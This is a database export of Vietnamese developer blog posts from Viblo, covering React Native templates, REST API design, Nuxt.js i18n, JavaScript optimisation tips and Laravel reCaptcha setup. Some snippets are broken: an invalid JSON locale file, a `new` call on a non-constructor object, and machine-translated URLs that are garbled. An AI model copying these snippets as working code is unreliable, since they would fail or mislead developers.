'scroll-view':\n    ContentTag = ScrollablePageContent;\n    break;\n   case 'keyboard-aware-scroll-view':\n    ContentTag = KeyboardAwareScrollablePageContent;\n    break;\n   default:\n    ContentTag = PageContent;\n  }\n  this.state = { ContentTag }\n }\n render() {\n  const { ContentTag } = this.state;\n  return (\n   <Wrapper> <HeaderComponent {...this.props} />\n    <ContentTag {...this.props} />\n   </Wrapper>\n  );\n }\n}\n```\n\nLƯU Ý:  Nếu bạn sử dụng\n- fastlane + react-native base, react-native-keyboard-aware-scroll-view sẽ hoạt động tốt \n- Dành cho Expo.IO, hãy nhớ:\n+ Add "androidStatusBar": { "backgroundColor": "#fff" } vào trong file app.json, nếu không bàn phím của bạn sẽ bao phủ các field Text.\n+ Bạn sẽ phải thêm ScrollView bên trong Bàn phím Aware Scroll View, nếu không, bàn phím của bạn sẽ đẩy nội dung của bạn lên và compress Components của bạn!\n\n### Step 5: \nChia main components của bạn thành các components nhỏ hơn (smaller components).\n\nTrong ứng dụng trên, các page có cùng cấu trúc bên trong Content:\n+ Intro\n+ Content\n+ Submit\n\nNếu Content của bạn có bố cục (layout) khác nhau cho hầu hết các màn hình, thì các bạn có thể bỏ qua bước 5 này. Nhưng nếu chỉ có 2 hoăc 3 loại layout, chúng ta sẽ thêm các kiểu layout dưới dạng custom.\n\n## Kết luận\nĐừng đánh giá thấp một thiết kế đơn giản cần được triển khai cho đa nền tảng và hãy cố gắng tạo đúng mẫu ngay từ đầu nhé. :D\n\nThanks for reading!	I. Tổng quan\nNhư các bạn cũng đã biết, React Native là một framework đã trở nên cực kỳ phổ biến vì nó cho phép các nhà phát triển tạo ra các ứng dụng đa nền tảng chạy trên Android và IOS, với common UI code-base được viết bằng Javascript. Hầu hết các nhà phát triển React Native cho rằng gần như 90% code chạy được trên cả hai nền tảng. Tuy nhiên, mỗi nền tảng sẽ đều yêu cầu hay cần thiết code na...	{https://images.viblo.asia/876084d5-3f44-4ce7-aad8-38384d5b7e37.png}	1	[React Native] Tạo Template cho ứng dụng	{template,android,react-native}	0	f	2022-12-18 15:33:38.179+00	2022-12-18 15:33:38.179+00
31953	Chương này đánh dấu một bước ngoặt quan trọng trong cuộc phiêu lưu của chúng ta với API. Chúng ta đã hoàn thành việc tìm hiểu các nguyên tắc cơ bản và bây giờ đã sẵn sàng để xem các khái niệm trước đó kết hợp với nhau như thế nào để tạo thành một API. Trong chương này, chúng ta sẽ thảo luận về các thành phần của API bằng cách thiết kế một API.\n\n## Sắp xếp dữ liệu\n\nNational Geographic ước tính rằng vào năm 2011, người Mỹ đã chụp 80 tỷ bức ảnh. Với rất nhiều bức ảnh, bạn có thể tưởng tượng ra những cách tiếp cận khác nhau mà mọi người phải tổ chức chúng trên máy tính của họ. Một số người thích đổ mọi thứ vào một thư mục. Những người khác tỉ mỉ sắp xếp hình ảnh của họ thành một hệ thống phân cấp các thư mục theo năm, tháng và sự kiện.\n\nCác công ty cũng có những suy nghĩ tương tự với tổ chức khi xây dựng API của họ. Như chúng tôi đã đề cập trong [Chương 1](https://viblo.asia/p/chapter-1-gioi-thieu-ve-apis-m68Z0RmA5kG), mục đích của API là giúp máy tính dễ dàng làm việc với dữ liệu của công ty. Để dễ sử dụng, một công ty có thể quyết định có một URL duy nhất cho tất cả dữ liệu và làm cho nó có thể tìm kiếm được (giống như có một thư mục cho tất cả ảnh của bạn). Một người khác có thể quyết định cung cấp cho mỗi phần dữ liệu URL của riêng mình, được sắp xếp theo thứ bậc (như có thư mục và thư mục con cho ảnh). Mỗi công ty chọn cách tốt nhất để cấu trúc API cho tình huống cụ thể của mình, tùy vào tình huống cũng như nghành nghề của mình.\n\n## Bắt đầu với Architectural Style\n\nKhi thảo luận về API, bạn có thể nghe nói về "soap"(xà phòng tắm) và "rest"(nghỉ ngơi) và tự hỏi liệu các nhà phát triển phần mềm đang làm việc hay lên kế hoạch cho một kỳ nghỉ. Sự thật là đây là tên của hai kiểu kiến trúc phổ biến nhất cho các API trên nền tảng web. SOAP là một thiết kế dựa trên XML có các cấu trúc được tiêu chuẩn hóa cho các yêu cầu và phản hồi. REST, viết tắt của Representational State Transfer, là một cách tiếp cận cởi mở hơn, cung cấp nhiều quy ước, nhưng để lại nhiều quyết định cho người thiết kế API.\n\nTrong suốt khóa học này, bạn có thể nhận thấy chúng ta có thiên hướng tập trung nói về API REST do tỷ lệ sử dụng đáng kinh ngạc của REST. Điều này không có nghĩa là SOAP là tệ hại; nó cũng có những điểm mạnh riêng. Tuy nhiên, trọng tâm của cuộc thảo luận của chúng ta sẽ là về REST vì đây có thể sẽ là loại API bạn gặp phải thường xuyên ngày nay. Trong các phần còn lại, chúng ta sẽ cùng tìm hiểu qua các thành phần tạo nên API REST.\n\n## Trước tiên hãy nói về resource\n\nQuay lại [Chương 2](https://viblo.asia/p/chapter-2-protocols-XL6lAkvBKek), chúng ta đã nói một chút về resources. Hãy nhớ lại rằng resources là danh từ của API (khách hàng và pizza). Đây là những điều chúng ta muốn thế giới có thể tương tác thông qua API của chúng ta.\n\nĐể cảm nhận về cách một công ty sẽ thiết kế API, hãy thử dùng nó với tiệm bánh pizza của chúng ta. Chúng ta sẽ bắt đầu bằng cách thêm khả năng đặt một chiếc bánh pizza.\n\nĐể khách hàng có thể nói chuyện với chúng ta, chúng ta cần thực hiện một số điều:\n\n1. Quyết định những resources (tài nguyên) nào cần có sẵn.\n2. Chỉ định URL cho các tài nguyên đó.\n3. Quyết định những hành động nào khách hàng sẽ được phép thực hiện trên các tài nguyên đó\n4. Chỉ ra những phần dữ liệu được yêu cầu cho mỗi hành động và chúng nên ở định dạng nào.\n\nNhiệm vụ khó khăn đầu tiên là chọn tài nguyên phù hợp. Một cách để tiếp cận vấn đề là bước qua những gì một tương tác điển hình liên quan. Đối với tiệm bánh pizza của chúng ta, chúng ta có thể có một thực đơn. Trên thực đơn đó là pizza. Khi một khách hàng muốn chúng ta làm một trong những chiếc pizza cho họ, họ đặt hàng. Trong bối cảnh này, thực đơn, pizza, khách hàng và đặt hàng tất cả là ứng cử viên tốt cho resource. Hãy bắt đầu với việc đặt hàng.\n\nBước tiếp theo là gán URL cho tài nguyên. Có rất nhiều khả năng, nhưng may mắn là các quy ước REST đưa ra một số hướng dẫn cụ thể. Trong REST API điển hình, tài nguyên sẽ có hai mẫu URL được gán cho nó. Đầu tiên là số nhiều của tên tài nguyên, ví dụ /orders. Thứ hai là số nhiều của tên tài nguyên cộng với một mã định danh duy nhất để chỉ định một tài nguyên ví dụ như /orders/<order_id>, trong đó <order_id> là định danh duy nhất cho một đơn hàng. Hai mẫu URL này tạo thành các điểm cuối mà API của chúng ta sẽ hỗ trợ. Chúng được gọi là điểm cuối đơn giản vì chúng ở cuối URL, như trong http://example.com/ <endpoint_goes_here>.\n\nChúng ta đã chọn resources của mình và gán URL cho nó, chúng ta cần quyết định những hành động nào khách hàng có thể thực hiện. Theo các quy ước REST, chúng ta nói rằng điểm cuối số nhiều (/orders) là để liệt kê các đơn hàng hiện có và tạo các đơn hàng mới. Số nhiều với định danh duy nhất (/orders/<order_id>) là để truy xuất, cập nhật hoặc hủy đơn hàng cụ thể. Máy khách báo cho máy chủ biết hành động nào cần thực hiện bằng cách gửi các hành động HTTP thích hợp (GET, POST, PUT hoặc DELETE) trong yêu cầu.\n\nNhìn chung, API của chúng ta bây giờ trông như thế này:\n\n| HTTP verb| Endpoint | Action |\n| -------- | -------- | -------- |\n|GET     | \t/orders\t     | List existing orders    | \n|POST     | \t/orders\t     | \tPlace a new order   | \n|GET     | \t/orders/1\t  | Get details for order #1 | \n|GET     | \t/orders/2\t  | Get details for order #2 | \n|PUT     | \t/orders/1\t  | Update order #1 | \n|DELETE     | \t/orders/1\t  |  Cancel order #1 | \n\nVới việc bổ sung hành động cho các điểm cuối, đơn hàng của chúng ta đã khá đầy đủ, bước cuối cùng là quyết định dữ liệu nào cần được trao đổi giữa máy khách và máy chủ. Mượn từ ví dụ tiệm bánh pizza của chúng tôi trong [Chương 3](https://viblo.asia/p/chapter-3-dinh-dang-du-lieu-RQqKLE8MZ7z), chúng ta có thể nói rằng một đơn đặt hàng cần một lớp vỏ và lớp phủ bên trên. Chúng ta cũng cần chọn một định dạng dữ liệu mà máy khách và máy chủ có thể sử dụng để truyền thông tin này qua lại. XML và JSON đều là những lựa chọn tốt, nhưng để dễ đọc, chúng ta sẽ sử dụng JSON.\n\nTại thời điểm này, bạn nên vỗ nhẹ vào lưng; chúng ta đã thiết kế một API chức năng! Đây là sự tương tác giữa máy khách và máy chủ khi sử dụng API này:\n![](https://images.zapier.com/storage/photos/a750f59281516eca160a4cd260b4855b.png?format=jpg)\n![](https://images.zapier.com/storage/photos/d9897460bbcf183fb4b030d19cfd9f00.png?format=jpg)\n![](https://images.zapier.com/storage/photos/c2f02983d51e59caf79e89927b5004fb.png?format=jpg)\n![](https://images.zapier.com/storage/photos/18e5277a3d4544d487264b1da1576986.png?format=jpg)\n\n## Liên kết các tài nguyên với nhau\n\nAPI tiệm bánh pizza của chúng ta trông thật sắc nét. Đơn đặt hàng đang đến nhiều hơn trước đây. Thực tế kinh doanh rất tốt, chúng ta quyết định chúng ta muốn bắt đầu theo dõi đơn đặt hàng của khách hàng để đánh giá lòng trung thành. Một cách dễ dàng để làm điều này là thêm một tài nguyên khách hàng mới.\n\nCũng giống như với các đơn đặt hàng, tài nguyên khách hàng của chúng tôi cần một số điểm cuối. Theo quy ước, /customers và /customers/<customer_id> vừa vặn. Chúng ta sẽ bỏ qua các chi tiết, nhưng hãy nói rằng chúng ta quyết định hành động nào có ý nghĩa đối với từng điểm cuối và dữ liệu nào đại diện cho khách hàng. Giả sử chúng ta làm tất cả những điều đó, chúng ta đi đến một câu hỏi thú vị: làm thế nào để chúng ta liên kết các đơn đặt hàng với khách hàng?\n\nNhững người sử dụng REST có nhiều ý kiến về cách giải quyết vấn đề liên kết các tài nguyên. Một số người nói rằng hệ thống phân cấp nên tiếp tục phát triển, đưa ra các điểm cuối như /customers/5/orders cho tất cả các đơn đặt hàng của khách hàng số 5 và /customers/5/orders/3 cho đơn hàng thứ ba của khách hàng số 5. Những người khác tranh luận để giữ mọi thứ bằng cách bao gồm các chi tiết liên quan trong dữ liệu cho một tài nguyên. Theo mô hình này, việc tạo đơn hàng yêu cầu trường khách hàng phải được gửi cùng với các chi tiết đơn hàng. Cả hai giải pháp đều được sử dụng bởi các API REST trong tự nhiên, vì vậy cần biết về từng giải pháp.\n\n![](https://images.zapier.com/storage/photos/4a57592d2e26dda5ff56e865b9ce56b1.png?format=jpg)\n\n## Searching Data\n\nKhi dữ liệu trong một hệ thống phát triển, các điểm cuối liệt kê tất cả các bản ghi trở nên không thực tế. Hãy tưởng tượng nếu cửa hàng pizza của chúng tôi có ba triệu đơn đặt hàng đã hoàn thành và bạn muốn tìm hiểu có bao nhiêu pepperoni như topping. Gửi một yêu cầu GET đến / đơn đặt hàng và nhận tất cả ba triệu đơn đặt hàng sẽ không hữu ích lắm. Rất may, REST có một cách tiện lợi để tìm kiếm thông qua dữ liệu.\n\nURL có một thành phần khác mà chúng tôi chưa đề cập, chuỗi truy vấn. Truy vấn có nghĩa là tìm kiếm và chuỗi có nghĩa là văn bản. Chuỗi truy vấn là một chút văn bản đi vào cuối URL để chuyển mọi thứ cho API. Ví dụ: mọi thứ sau dấu chấm hỏi là chuỗi truy vấn trong http://example.com/nings?key=value.\n\nREST API sử dụng chuỗi truy vấn để xác định chi tiết tìm kiếm. Những chi tiết này được gọi là tham số truy vấn. API chỉ ra những tham số nào sẽ chấp nhận và tên chính xác của các tham số đó cần được sử dụng cho chúng để thực hiện tìm kiếm. API tiệm bánh pizza của chúng tôi có thể cho phép khách hàng tìm kiếm đơn hàng bằng cách đứng đầu bằng cách sử dụng URL này: http://example.com/nings?topping=pepperoni. Máy khách có thể bao gồm nhiều tham số truy vấn bằng cách liệt kê lần lượt từng tham số, phân tách chúng bằng dấu và ("&"). Ví dụ: http://example.com/nings?topping=pepperoni&crust=thin.\n\nMột cách sử dụng khác của chuỗi truy vấn là giới hạn số lượng dữ liệu được trả về trong mỗi yêu cầu. Thông thường, các API sẽ chia kết quả thành các bộ (ví dụ 100 hoặc 500 bản ghi) và trả về một bộ tại một thời điểm. Quá trình phân tách dữ liệu này được gọi là phân trang (tương tự như chia nhỏ các từ thành các trang cho sách). Để cho phép khách hàng chuyển trang qua tất cả dữ liệu, API sẽ hỗ trợ các tham số truy vấn cho phép khách hàng chỉ định trang dữ liệu nào họ muốn. Trong API tiệm bánh pizza của chúng ta, chúng ta có thể hỗ trợ phân trang bằng cách cho phép khách hàng chỉ định hai tham số: trang và kích thước. Nếu khách hàng thực hiện một yêu cầu như GET / đơn hàng? Page = 2 & size = 200, chúng ta biết họ muốn trang kết quả thứ hai, với 200 kết quả trên mỗi trang, vì vậy đơn hàng 201-400.\n\n## Chapter 6 Recap\n\nTrong chương này, chúng ta đã học cách thiết kế API REST. Chúng tôi đã chỉ ra các chức năng cơ bản mà API hỗ trợ và cách tổ chức dữ liệu để máy tính có thể dễ dàng sử dụng.\n\nCác thuật ngữ chính chúng ta đã học là:\n\n* SOAP: Kiến trúc API được biết đến với các định dạng thông báo được tiêu chuẩn hóa\n* REST: Kiến trúc API xoay quanh việc thao túng tài nguyên\n* Tài nguyên: Thuật ngữ API cho danh từ như khách hàng hoặc đơn hàng\n* Điểm cuối: Một URL tạo nên một phần của API. Trong REST, mỗi tài nguyên có các điểm cuối riêng\n* Chuỗi truy vấn: Một phần của URL được sử dụng để truyền dữ liệu đến máy chủ\n* Tham số truy vấn: Một cặp khóa-giá trị được tìm thấy trong chuỗi truy vấn (topping = cheese)\n* Phân trang: Quá trình phân chia kết quả thành các phần có thể quản lý\n\n## Next\n\nTrong chương tiếp theo, chúng ta sẽ khám phá các cách để làm cho máy khách phản ứng với các thay đổi trên máy chủ theo thời gian thực.\n\nGo to Chapter 7!\n\n## TÀI LIỆU THAM KHẢO\n\nhttps://zapier.com/learn/apis/chapter-6-api-design/	Chương này đánh dấu một bước ngoặt quan trọng trong cuộc phiêu lưu của chúng ta với API. Chúng ta đã hoàn thành việc tìm hiểu các nguyên tắc cơ bản và bây giờ đã sẵn sàng để xem các khái niệm trước đó kết hợp với nhau như thế nào để tạo thành một API. Trong chương này, chúng ta sẽ thảo luận về các thành phần của API bằng cách thiết kế một API.\n\nSắp xếp dữ liệu\n\nNational Geographic ước tính rằng...	{https://images.zapier.com/storage/photos/a750f59281516eca160a4cd260b4855b.png?format=jpg,https://images.zapier.com/storage/photos/d9897460bbcf183fb4b030d19cfd9f00.png?format=jpg,https://images.zapier.com/storage/photos/c2f02983d51e59caf79e89927b5004fb.png?format=jpg,https://images.zapier.com/storage/photos/18e5277a3d4544d487264b1da1576986.png?format=jpg,https://images.zapier.com/storage/photos/4a57592d2e26dda5ff56e865b9ce56b1.png?format=jpg}	1	Chapter 6: Thiết kế API	{api,api-design}	0	f	2022-12-18 15:33:38.199+00	2022-12-18 15:33:38.199+00
31955	{@slideshare: https://www.slideshare.net/quachdaiphuc/laravel-testing-155525549}		{}	1	[Slide Only] Laravel testing	{laravel,testing,unit-test}	0	f	2022-12-18 15:33:38.235+00	2022-12-18 15:33:38.235+00
31947	### I. Lời mở đầu\nVẫn nằm trong series Vuejs siêu to khổng lồ của mình [Cùng học Vuejs](https://viblo.asia/s/2018-cung-nhau-hoc-vuejs-b85ogvV252G) . Các bài viết gần nhất của mình cũng xoay quanh việc sử dụng hiệu quả, một vài tips hay khi sử dụng vuejs và nuxtjs =)).\nMọi người ơi, mọi người ơi và trong bài viết này mình sẽ giới thiệu cho các bạn một tính năng vô cùng cần thiết cho website. Tèng teng... không quá mới mẻ nhưng mà mình nghĩ khá cần thiết trong thời buổi thương mại điện tử và hòa nhập quốc tế như hiện nay :D :D :D. Đó là ... đa ngôn ngữ cho website mà khi bạn sử dụng nuxtjs.\n\n![](https://images.viblo.asia/f462c697-ecca-4541-bf90-d1b37a8a03b0.jpg)\n### II. Nội dung chính\n**1. Khởi tạo project:**\n- Tạo ngay một nuxt-app cho nóng nào:\n```bash\n$ npx create-nuxt-app <project-name>\n```\nHoặc cài với yarn\n```bash\n$ yarn create nuxt-app <project-name>\n```\nTiếp tục cài đặt nuxt\n```bash\n$ npm install --save nuxt\n```\nSau khi cài xong nuxt-app ta thu được folder như bên dưới:\n\n**2. Cài đặt package hỗ trơ đa ngôn ngữ:**\n- Trong bài viết này package mà mình sử dụng là: vue-i18n, các bạn cũng có thể dùng [nuxt-i18n](https://nuxt-community.github.io/nuxt-i18n/basic-usage.html#nuxt-link). Nhưng mình có tìm hiểu thì nuxt-i18n cũng được mở rộng từ vue-i18n. Và một điều nữa là trong quá trình sử dụng, mình thấy việc áp dụng vue-i18n mà mình sắp giới thiệu bên dưới về: cài đặt, cấu trúc folder và viết code thì khá là dễ hiểu, tách bạch và dễ mở rộng khi project ngày một lớn.\n- Cài đặt package, mình thì có thói quen dùng yarn, các bạn cũng có thể dùng npm để cài đặt:\n```bash\n$ yarn add vue-i18n\n```\nhoặc\n```bash\n $ npm install vue-i18n --save\n```\nSau khi cài đặt thành công, bạn có thể xem package đã được cài đặt chưa trong package.json\n```js\n    "vue-i18n": "^8.11.2"\n```\nCông việc tiếp theo của chúng ta là đi tạo plugins và đăng ký vuej-18n trong nuxtjs:\n\nTạo folder app:\n- Tạo folder locales và lần lượt các file: en.json, vi.json, jp.json các file này chính là nơi viết bản dịch cho các ngôn ngữ. Website hỗ trợ cho bao nhiêu ngôn ngữ thì tương ứng với bấy nhiêu file .json\nMình lấy ví dụ website của mình hỗ trợ 3 ngôn ngữ Anh-Việt-Nhật và mình muốn dịch cho từ "Đăng nhập" thì mình có tạo như sau:\n\nen\n```json\n{\n    "login": "login",\n    //Bạn cũng có thể viết lồng nhiều object\n    "header" : {\n        "home": trang chủ\n    }\n}\n```\nvi\n```json\n{\n    "login": "Đăng nhập"\n}\n```\njapan\n```json\n{\n    "login": "ログイン"\n}\n```\nKhi cần thêm bản dịch cho từ hay đoạn văn bản nào thêm lần lượt vào các file này nhé aihihi.\nTạo thêm store để có thể thay đổi ngôn ngữ được dễ dàng: i18n.js\nỞ đây mình có dùng hàm find của lodash nên các bạn add thêm lodash vào nhé.\n```bash\nyarn add lodash\n```\n```js\nimport _find from 'lodash/find';\n\nexport const state = () => ({\n    locales: [\n        { value: 'vi', label: 'VI' },\n        { value: 'en', label: 'EN' },\n        { value: 'jp', label: 'JP' },\n    ],\n    locale: 'vi',\n});\n\nexport const mutations = {\n    set(state, locale) {\n        const isLocale = _find(state.locales, { value: locale });\n        if (isLocale) {\n            state.locale = locale;\n        }\n    },\n};\n```\nTrong state mình có tạo locales là list các ngôn ngữ hỗ trợ và locale là ngôn ngữ dùng cho website mình có để default là tiếng việt có value là: 'vi'.\nVà tạo hàm set mutations để thay đổi ngôn ngữ nữa.\n- Tạo thêm folder plugins và 1 file có tên i18n.js\n```js\nimport Vue from 'vue';\nimport VueI18n from 'vue-i18n';\n\nVue.use(VueI18n);\n\nexport default ({ app, store }) => {\n    app.i18n = new VueI18n({\n        locale: store.state.i18n.locale,\n        fallbackLocale: 'vi',\n        messages: {\n            en: require('~/locales/en.json'),\n            vi: require('~/locales/vi.json'),\n            jp: require('~/locales/jp.json'),\n        },\n    });\n};\n```\n- locale: ngôn ngữ đăng ký trong package.\n- fallbackLocale: ngôn ngữ dự phòng được chọn nếu locale không tồn tại. \n- messages: require để đọc nội dùng các file json các ngôn ngữ mà ta viết ở trên.\n\nlocale nào thì sẽ ứng với messages và nội dung trong đó. Khi store thay đổi thì nội dung ngôn ngữ cũng thay đổi theo các bạn nhé.\nVà cuối cùng ta đăng ký plugins trong nuxt.config.js\n```js\nplugins: [\n        '~/plugins/i18n.js',\n    ],\n```\n**3. Tiến hành đa ngôn ngữ**\n- Nút thay đổi ngôn ngữ:\n```js\n<template>\n    <select :value="locale" @change="onChangeLanguage">\n       <option v-for="(item, index) in locales"\n             :key="index"\n             :label="item.label"\n             :value="item.value"\n         />\n    </select>\n</template>\n<script>\n    import { mapState } from 'vuex';\n\n        computed: {\n            ...mapState('i18n', ['locale', 'locales']),\n        },\n        methods: {\n            onChangeLanguage(locale) {\n                    this.$store.commit('i18n/set', locale);\n            },\n        },\n ```\n- Viết code để có thể thay đổi ngôn ngữ:\n```js\n<button>{{ $t('login') }}</button>\n```\nKhá là đơn giản đúng không nào, chỉ cần dùng $t và bên trong chính là key của từ được viết trong file json trong foler locales. Và nếu trong file json viết lồng nhiều các object ta cứ viết lần lượt\n```js\n<h1>{{ $t('header.home') }}</h1>\n```\n### III. Tạm kết\nĐến đây thì bạn đã có thể đa ngôn ngữ một cách dễ dàng cho website có sử dụng nuxtjs rồi đúng không nào. Rất mong được sự góp ý của các bạn để có được những đoạn code đẹp nhất. Đừng quên like và subcribe,... à nhầm vote và follow mình nhé.\n![](https://images.viblo.asia/44306c29-91cb-43f1-9ca1-b6ebeb10fb48.jpg)	I. Lời mở đầu\nVẫn nằm trong series Vuejs siêu to khổng lồ của mình Cùng học Vuejs . Các bài viết gần nhất của mình cũng xoay quanh việc sử dụng hiệu quả, một vài tips hay khi sử dụng vuejs và nuxtjs =)).\nMọi người ơi, mọi người ơi và trong bài viết này mình sẽ giới thiệu cho các bạn một tính năng vô cùng cần thiết cho website. Tèng teng... không quá mới mẻ nhưng mà mình nghĩ khá cần thiết trong...	{https://images.viblo.asia/f462c697-ecca-4541-bf90-d1b37a8a03b0.jpg,https://images.viblo.asia/44306c29-91cb-43f1-9ca1-b6ebeb10fb48.jpg}	1	Đa ngôn ngữ cho website có sử dụng Nuxtjs	{ssr,i18n,vuejs,cungnhauhocvuejs2018,nuxtjs}	0	f	2022-12-18 15:33:38.273+00	2022-12-18 15:33:38.273+00
31928	Chào các bạn , hôm nay mình lại quay lại đây, hôm nay mình sẽ chia sẻ cho các bạn về cách tối ưu code JS của mình. Mình mới khi đi làm lúc nào cũng có tư tưởng là code để nó chạy là ngon rồi , cần gì phải tối ưu rách việc tốn time, time đấy để làm task khác cho nhanh, nhưng khi làm lâu rồi , rồi làm với team nhiều người mới biết tối ưu code của mình nó quan trọng như nào. Nhiều hôm ngồi đọc lại những đoạn code của mình ngày xưa xong bảo ngồi debug lại xem luồng nó chạy thế nào cũng toát cả mồ hôi, =)) \n\nTối ưu code không những giúp ứng dụng của bạn chạy nhanh, tạo cảm giác mượt mà khi maintain mình làm việc cũng nhanh hơn, sau đây là những mẹo để tối ưu code\n\n#  Reduce library dependencies\nĐiều đầu tiên chúng ta đề cập tới đó là giảm những thư viện không cần thiết, thời gian tải một website phụ thuộc rất nhiều của thư viện, do đó khuyên bạn nên sử dụng chúng càng ít càng tốt hoặc tốt nhất là không dùng tới nó. Một cách tuyệt vời để giải quyết vấn đề này đó là các bạn nên tận dụng những kỹ thuật hay các thư viện thích hợp sẵn của browser.\n#  Minify JavaScript\nĐiều này chắc không một ai trong số developer js đều không biết đến kỹ thuật này. Một kỹ thuật đơn giản nhưng mang lại hiểu quả rất cao. Xóa dữ liệu dư thừa và không cần thiết khỏi code của bạn mà không ảnh hưởng đến cách browser xử lý tài nguyên đó chính là minification. Ví dụ, loại bỏ code không sử dụng, rút ngắn chức năng và tên biến, nhận xét mã và định dạng. Một tool có thể giúp bạn rất phổ biến đó là Google Closure Compiler. Điều này cũng giúp webiste của bạn được google ưu tiên hơn những trang khác vì có sự khác biệt về tốc độ tải.\n#  Minimize scope chain Immediate\nscope chain, các đối số của hàm và bất kỳ biến được khai báo cục bộ nào sẽ được khởi tạo khi bất kỳ hàm nào được thực thi trong JavaScript. Vì vậy, để truy cập vào một biến được khai báo toàn cầu, cần có thời gian để leo lên scope chain. Sử dụng keyword "this" khóa này và giảm call stack’s Dept sẽ tăng tốc độ thực thi. Các bạn nên tìm hiểu thêm scope chain là gì?\n> Scope chain thiết lập cho mỗi scope một function nhất định. Mỗi function lại định nghĩa nested scope riêng như ta đã biết, và mỗi function được định nghĩa trong một function khác đều là local scope được liên kết với function bên ngoài – sự kết nối ấy được gọi là chain. Khi giải quyết một biến, JS bắt đầu với scope bên trong, sau đó tìm kiếm dần mở rộng ra bên ngoài cácbiến/object/function cho đến khi chúng được tìm thấy.\n> \n# Using ‘this’ keyword\nthis keyword hoạt động như local chain và  nó làm giảm sự phụ thuộc vào các biến toàn cục cũng như closures trong các chuỗi phạm vi cao hơn. Ngược lại, khuyên bạn nên tránh with keyword. Bởi vì nó có thể sửa đổi scope chain, xem ví dụ này:\n```js\nvar Car = Object.create({\n    init: function(brand) {\n        this.brand = brand;\n    },\n    do: function(callback) {\n        callback.apply(this);\n    }\n});\n\nvar audi = new Car('audi');\naudi.do(function() {\n    alert(this.brand); // 'audi' is alerted because 'this' was rewired\n});\n```\n#  Use Async and Defer\nNó rất quan trọng trong việc tải hay load một page với nhiều thư viện. Synchronous loading cần đợi cho đến khi asset trước kết thúc load nhưng tải không đồng bộ có thể asynchronous loading. \nVì vậy, để tận dụng tải asynchronous loading, hãy sử dụng các thuộc tính async. Ví dụ:\n\n```js\n<script src="/example.js" async></script>\n//load example.js without interrupting webpage rendering\n```\n# Cache as much as possible\nĐương nhiên rồi với một mẹo cache các bạn đã giúp hiệu năng tăng lên một cách đáng kể, thay vì các bạn biết một object có thể lạp lại nhiều lần, vậy thì hà cớ gì các bạn lại lục lõi vào database để lấy kết quả mà bạn đã biết trước. Tahy vì điều đó các bạn hãy tận dụng cache của browser, nó sẽ giúp bạn rất nhiều trong việc thực thi data.\n#  Taking advantage of native functions\nECMAScript là một thư mục rất lớn của các cấu trúc native. Còn chờ đợi gì nưã sử dụng các hàm và native functions sẽ tối ưu hóa hiệu suất JavaScript hơn là viết các thuật toán riêng hoặc dựa vào các đối tượng máy chủ. Trong blog anonystick có rất nhiều bài nói về ECMAScript các bạn nên tìm đọc. \n# Trim HTML\nThời gian tải của một truy vấn và các đối tượng DOM được sửa đổi chủ yếu phụ thuộc vào trang web HTML HTML. Giảm một nữa HTML của một ứng dụng có thể tăng gấp đôi tốc độ DOM. Nó khó khăn nhưng loại bỏ không cần thiết và các thẻ sẽ là một khởi đầu tuyệt vời cho website của bạn.\n\n# Kết luận\nĐây là những mẹo mà mình đã từng áp dụng hoặc cũng từng tìm hiểu qua mong với chút kiến thức chia sẻ cho mn có thể giúp mn code 1 cách tốt hơn\n\nTham khảo: https://askbootstrap.com/web-tips-and-tricks/top-10-javascript-optimisation-tips-to-sharpen-your-professional-skill/	Chào các bạn , hôm nay mình lại quay lại đây, hôm nay mình sẽ chia sẻ cho các bạn về cách tối ưu code JS của mình. Mình mới khi đi làm lúc nào cũng có tư tưởng là code để nó chạy là ngon rồi , cần gì phải tối ưu rách việc tốn time, time đấy để làm task khác cho nhanh, nhưng khi làm lâu rồi , rồi làm với team nhiều người mới biết tối ưu code của mình nó quan trọng như nào. Nhiều hôm ngồi đọc lại...	{}	1	[Javascript] Những mẹo tối ưu hóa JS để nâng cao kỹ năng của bạn	{js}	0	f	2022-12-18 15:33:38.295+00	2022-12-18 15:33:38.295+00
31929	![](https://images.viblo.asia/90e9447a-ba5f-401b-a2e0-7634a3c29814.jpeg)\nTrong bài viết này,  Mình sẽ triển khai cách xác thực người người dùng bằng Recaptcha trong Laravel 5.8. Mình sẽ viết từng bước hướng dẫn cách sử dụng google captcha bằng cách install package 'anhskohbo / no-captcha' trong ứng dụng laravel 5.8. Và các bạn có thể đơn giản sử dụng mã xác nhận lại google trong mẫu đăng ký của mình.\n\nGoogle ReCaptcha là một hệ thống giống như captcha, cung cấp bảo mật chống lại tin tặc và robot dò mã hoặc yêu cầu cuộn tròn. Nó đảm bảo rằng người dùng máy tính là một con người. Đây là hệ thống captcha tốt nhất và được sử dụng nhiều nhất hiện có khi người dùng chỉ cần nhấp vào nút kiểm tra và trong một số trường hợp, thì là chọn một số hình ảnh tương tự liên quan đến câu hỏi conman.\n\nTrong ví dụ này, Mình sẽ tạo biểu mẫu đăng ký đơn giản và triển khai mã captcha của google. trước khi sử dụng mã Google captcha, Mình sẽ cài đặt package "anhskohbo / no-captcha" cho google captcha. Bạn chỉ cần làm theo vài bước và bạn sẽ nhận được mã xác nhận lại google trong ứng dụng laravel 5.8 của mình, nào let's go !.\n\n### Các bước triển khai cơ bản.\n Step 1 : Download Laravel 5.8\n Step 2: Install anhskohbo/no-captcha Package\n Step 3: Update Google API Key\n Step 4: Add Route\n Step 5: Create CaptchaController\n Step 6: Create View File\n \n##  Download Project Laravel.\nPhần này là đương nhiên rồi, chúng ta muốn tạo dự án trên FW laravel thì chúng ta cần phải download FW về local của mình. Các bạn chạy cậu lệnh bên dưới để download.\n```\ncomposer create-project --prefer-dist laravel/laravel LaravelCaptcha\n```\nSau khi đã download dự án về máy thành công, các bạn di chuyển tới file .env để config lại data cho phù hợp với thông tin data trên mysql của các bạn.\n```\nDB_CONNECTION=mysql \nDB_HOST=127.0.0.1 \nDB_PORT=3306 \nDB_DATABASE=here your database name here\nDB_USERNAME=here database username here\nDB_PASSWORD=here database password here\n```\n\n## Install Google Captcha Package\nTiếp theo các bạn chạy câu lệnh bên dưới để install package anh anhskohbo/no-captcha.\n```\ncomposer require anhskohbo/no-captcha\n```\n\n## Update Google API Key\nTiếp theo các bạn hay click vào link mà mình để bên dưới [Để Tạo Google reCaptcha cho website của bạn](https://www.google.com/recaptcha/admin/create#list)\n![](https://images.viblo.asia/e5970d32-91cb-4c68-8bf6-886dd0d32ca8.png)\nCác bạn hãy điền những thông thick hợp vào các form đăng ký sau đó nhấn Submit.\n\n![](https://images.viblo.asia/c32a303c-17a4-4668-a3f8-4cd7514daa18.png)\nTrang kế tiếp sau khi Submit sẽ như thế này.\n\nTiếp theo 